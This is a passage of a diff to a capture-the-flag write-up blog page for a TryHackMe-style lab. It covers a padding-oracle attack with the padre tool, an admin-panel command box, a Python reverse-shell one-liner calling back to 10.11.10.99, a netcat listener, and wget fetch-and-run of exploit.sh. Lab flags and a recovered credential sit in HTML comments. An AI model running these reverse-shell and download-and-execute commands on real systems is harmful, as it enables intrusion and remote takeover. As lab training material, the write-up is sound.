+<li><a href="https://github.com/glebarez/padre?tab=readme-ov-file" target="_blank" rel="noopener">glebarez/padre</a>
+ - <a href="https://github.com/glebarez/padre/releases/latest" target="_blank" rel="noopener">binary</a>
+ - fast</li>
+</ol>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">chmod +x padre-linux-amd64
+</span></span><span class="line"><span class="cl">./padpadre-linux-amd64re -u <span class="s1">&#39;http://nythm.com:8080/api/debug/$&#39;</span> -e lhex 39353661353931393932373334633638EA0DCC6E567F96414433DDF5DC29CDD5E418961C0504891F0DED96BA57BE8FCFF2642D7637186446142B2C95BCDEDCCB6D8D29BE4427F26D6C1B48471F810EF4
+</span></span></code></pre></div><!-- flag1: stefan1197:ebb2B76@62#f??7cA6B76@6!@62#f6dacd2599 -->
+<p>The above exploits will give the username and password in the format <strong>username:password</strong>, which is the <strong>flag1</strong> of this lab.</p>
+<h3 id="admin-login">Admin login</h3>
+<p>lets use the username:password combination to login the admin panel.</p>
+<!--flag2: THM{a4113536187c6e84637a1ee2ec5359eca17bbbd1b2629b23dbfd3b4ce2f30604} -->
+
+
+
+
+<figure>
+    <img src="/posts/thenewyorkflankees/14.png" title="Successful Addmin login" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Successful Addmin login</strong>
+    </figcaption>  
+</figure>
+
+<p>Kudos!!! &#x1f929; We found the <strong>flag2</strong>. There is a command box and a submit button which we might be useful to get reverse shell. Lets check its behaviour.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thenewyorkflankees/15.png" title="Executing valid command" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Executing valid command</strong>
+    </figcaption>  
+</figure>
+
+<p>Executing valid command gives <strong>OK</strong> response.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thenewyorkflankees/16.png" title="Executing invalid command" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Executing invalid command</strong>
+    </figcaption>  
+</figure>
+
+<p>Executing invalid command gives <strong>empyt response</strong>. Lets use this behaviour to get reverse shell code.</p>
+<h3 id="reverse-shell">Reverse Shell</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.11.10.99&#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;sh&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Replace the LHOST(10.11.10.99) with your local ip.</span>
+</span></span></code></pre></div><p>Using <a href="https://www.revshells.com/" target="_blank" rel="noopener">Reverse Shell Generator</a>
+ to get reverse shell commands, and confirming the valid command using response from the command. The above command gives <strong>OK</strong> response, means working without any errors. But not getting reverse shell connection. So, creating a shell script <strong>exploit.sh</strong> in local machine which will be usefull for reverse shell. The contents of the script exploit.sh should be the above command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -nvlp <span class="m">1234</span>
+</span></span></code></pre></div><p>Setting up the <strong>listener</strong> in local machine using the above command in the <strong>port 1234</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python -m http.server <span class="m">8000</span>
+</span></span></code></pre></div><p>Starting Python HTTP Server in the directory of exploit.sh script, to transfer it to the target system. This will start the http server in <strong>port 8000</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://10.11.10.99:8000/exploit.sh
+</span></span><span class="line"><span class="cl">chmod +x exploit.sh
+</span></span><span class="line"><span class="cl">./exploit.sh
+</span></span><span class="line"><span class="cl"><span class="c1"># Replace 10.11.10.99 your local ip address.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># The above commands should be runned individually.</span>
+</span></span></code></pre></div><p>Running the above commands in exec.html makes reverse shell. Now we are in the target system as <strong>root</strong> user.&#x1f60e;</p>
+<h3 id="interactive-shell">Interactive shell</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> python3 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl"> ^Z <span class="c1">#(Ctrl+z)</span>
+</span></span><span class="line"><span class="cl"> stty raw -echo <span class="o">&amp;&amp;</span> <span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"> <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span></code></pre></div><p>Got Interactive shell by running the above commands.</p>
+<p>Lets enumarate the files in the target system for next flag. Found an interesting directory <strong>/app/</strong>.</p>
+<pre tabindex="0"><code>root@02e849f307cc:/app# ls
 Dockerfile          gradle             ktor-docker-sample.jar
 README.md           gradle.properties  settings.gradle.kts
 build.gradle.kts    gradlew            src
@@ -84,7 +633,11 @@ root@02e849f307cc:/app# cat README.md
 # README
 
 * To get started, simply run `docker-compose up`
-</code></pre><p>Directory <strong>/app/</strong> contains files related to <strong>docker</strong>. We can also found <strong>README.md</strong> file which is pointing to docker-compose file. Viewing the contents of <strong>/app/docker-compose.yml</strong> we got the next <strong>flag3</strong>.</p><p>Lets check for the docker, and run it if exits.</p><h3 id=docker>Docker</h3><pre tabindex=0><code>root@02e849f307cc:/# docker images
+</code></pre><p>Directory <strong>/app/</strong> contains files related to <strong>docker</strong>. We can also found <strong>README.md</strong> file which is pointing to docker-compose file. Viewing the contents of <strong>/app/docker-compose.yml</strong> we got the next <strong>flag3</strong>.</p>
+ <!-- flag3: THM{342878cd14051bd787352ee73c75381b1803491e4e5ac729a91a03e3c889c2bf}-->
+<p>Lets check for the docker, and run it if exits.</p>
+<h3 id="docker">Docker</h3>
+<pre tabindex="0"><code>root@02e849f307cc:/# docker images
 REPOSITORY               TAG       IMAGE ID       CREATED        SIZE
 padding-oracle-app_web   latest    cd6261dd9dda   2 months ago   1.01GB
 &lt;none&gt;                   &lt;none&gt;    4187efabd0a5   2 months ago   704MB
@@ -99,6 +652,165 @@ boot  etc  home      lib32  libx32  media       opt  root  sbin  srv   tmp  var
 
 root@e62f1c047af3:/# cat flag.txt 
 THM{FLAG}
-</code></pre><p>There were 4 docker images available on the system. While trying to run one of the docker, we got interactive shell in it. Here we got the <strong>flag4</strong>.</p><p>This is end of the lab &#x1f36d;<br>Happy Hacking!!!&#x1f47d;</p></article><script type=text/javascript>(function(){const i=document.querySelector(".darkmode-toggle input"),s="light",n="dark";let a=localStorage.theme===n||!("theme"in localStorage)&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=a?n:s;const e=document.createElement("script");e.type="text/javascript";const r={repo:"cyberjagadeesh/cyberjagadeesh.github.io",repoId:"R_kgDOMfA4MA",category:"General",categoryId:"DIC_kwDOMfA4MM4ChYzn",mapping:"url",reactionsEnabled:"1",emitMetadata:"0",theme:t,lang:"en"};e.src="https://giscus.app/client.js",e.crossorigin="anonymous",e.async=!0,Object.entries(r).forEach(function(t){return e.dataset[t[0]]=t[1]});const o=document.currentScript;o.parentNode.insertBefore(e,o);function c(e){const t=document.querySelector("iframe.giscus-frame");if(!t)return;t.contentWindow.postMessage({giscus:e},"https://giscus.app")}i.addEventListener("change",function(){this.checked?t=n:t=s,c({setConfig:{theme:t}})})})()</script></div></div></div></main><footer class="flex flex-none justify-center"><section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300"><div class="flex flex-row"><a href=https://www.linkedin.com/in/jagadeeshwaran-m-562a011b3 target=_blank title=LinkedIn class="flex flex-row mr-2"><span class=hidden>LinkedIn</span>
-<i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M4 4m0 2a2 2 0 012-2h12a2 2 0 012 2v12a2 2 0 01-2 2H6a2 2 0 01-2-2z"/><path d="M8 11v5"/><path d="M8 8v.01"/><path d="M12 16v-5"/><path d="M16 16v-3a2 2 0 00-4 0"/></svg></i></a></div><div class=grow></div><div class="flex flex-row"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-9 0a9 9 0 1018 0A9 9 0 103 12"/><path d="M14 9.75a3.016 3.016.0 00-4.163.173 2.993 2.993.0 000 4.154A3.016 3.016.0 0014 14.25"/></svg>
-</i>2024 CyberJagadeesh</div></section></footer><script src=/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js></script><div class="hidden top-1 right-1" id=code-copy><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667A2.667 2.667.0 019.667 7h8.666A2.667 2.667.0 0121 9.667v8.666A2.667 2.667.0 0118.333 21H9.667A2.667 2.667.0 017 18.333z"/><path d="M4.012 16.737A2.005 2.005.0 013 15V5c0-1.1.9-2 2-2h10c.75.0 1.158.385 1.5 1"/></svg></i></div><div class="hidden top-1 right-1" id=code-copy-done><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12l5 5L20 7"/></svg></i></div><script src=/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js></script></body></html>
+</code></pre><!-- flag4: THM{b3653cb04abf4a5b9c7a77ec52f550e73416b6e61015b8014fff9831a7eb61ce} -->
+<p>There were 4 docker images available on the system. While trying to run one of the docker, we got interactive shell in it. Here we got the <strong>flag4</strong>.</p>
+<p>This is end of the lab &#x1f36d;<br>
+Happy Hacking!!!&#x1f47d;</p>
+
+      </article>
+
+      
+      
+
+
+  
+<script type="text/javascript">
+  (function() {
+    const themeToggle = document.querySelector('.darkmode-toggle input');
+    const light = 'light';
+    const dark = 'dark';
+    let isDark = localStorage.theme === dark || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches);
+    let theme = isDark ? dark : light;
+
+    const s = document.createElement('script');
+    s.type = 'text/javascript';
+    const dataset = {
+        repo: 'cyberjagadeesh\/cyberjagadeesh.github.io',
+        repoId: 'R_kgDOMfA4MA',
+        category: 'General',
+        categoryId: 'DIC_kwDOMfA4MM4ChYzn',
+        mapping: 'url',
+        reactionsEnabled: '1',
+        emitMetadata: '0',
+        theme: theme,
+        lang: 'en',
+    };
+    s.src = 'https://giscus.app/client.js';
+    s.crossorigin = 'anonymous';
+    s.async = true;
+    Object.entries(dataset).forEach(function(a) {
+        return s.dataset[a[0]] = a[1];
+    });
+
+    const curScriptElement = document.currentScript;
+    curScriptElement.parentNode.insertBefore(s, curScriptElement);
+
+    function sendMessage(message) {
+      const iframe = document.querySelector('iframe.giscus-frame');
+      
+      if (!iframe) return;
+      iframe.contentWindow.postMessage({ giscus: message }, 'https://giscus.app');
+    }
+
+    themeToggle.addEventListener('change', function () {
+      if (this.checked) {
+        theme = dark;
+      } else {
+        theme = light;
+      }
+      sendMessage({
+        setConfig: {
+          theme: theme,
+        }
+      });
+    });
+  })();
+</script>
+  
+
+
+      
+
+    </div>
+  </div>
+</div>
+
+  </main>
+  <footer class="flex flex-none justify-center">
+    <section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300">
+  <div class="flex flex-row">
+    
+  
+  
+  
+  
+  
+  
+  
+  
+    <a href="https://www.linkedin.com/in/jagadeeshwaran-m-27598134b" target="_blank" title="LinkedIn" class="flex flex-row mr-2">
+      <span class="hidden">LinkedIn</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
+   <path d="M8 11l0 5"></path>
+   <path d="M8 8l0 .01"></path>
+   <path d="M12 16l0 -5"></path>
+   <path d="M16 16v-3a2 2 0 0 0 -4 0"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+    <a href="https://www.linkedin.com/in/jagadeeshwaran-m-562a011b3" target="_blank" title="LinkedIn" class="flex flex-row mr-2">
+      <span class="hidden">LinkedIn</span>
+      <i class="h-6 w-6 flex-none"> <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-linkedin" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M4 4m0 2a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2z"></path>
+   <path d="M8 11l0 5"></path>
+   <path d="M8 8l0 .01"></path>
+   <path d="M12 16l0 -5"></path>
+   <path d="M16 16v-3a2 2 0 0 0 -4 0"></path>
+</svg>
+ </i>
+    </a>
+  
+  
+  
+  
+
+
+  </div>
+  <div class="grow"></div>
+  <div class="flex flex-row">
+    <i class="h-6 w-6 flex-none"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+   <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+   <path d="M12 12m-9 0a9 9 0 1 0 18 0a9 9 0 1 0 -18 0"></path>
+   <path d="M14 9.75a3.016 3.016 0 0 0 -4.163 .173a2.993 2.993 0 0 0 0 4.154a3.016 3.016 0 0 0 4.163 .173"></path>
+</svg>
+</i> 2024 - 2025 CyberJagadeesh
+    
+  </div>
+  
+</section>
+
+  </footer>
+  <script src="/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js"></script>
+
+<div class="hidden top-1 right-1" id="code-copy">
+  <i class="h-6 w-6 block">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" />
+  <path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" />
+</svg>
+
+  </i>
+</div>
+<div class="hidden top-1 right-1" id="code-copy-done">
+  <i class="h-6 w-6 block">
+    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M5 12l5 5l10 -10" />
+</svg>
+
+  </i>
+</div><script src="/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js"></script>
+
+
+
+
+
+</body>
+</html>
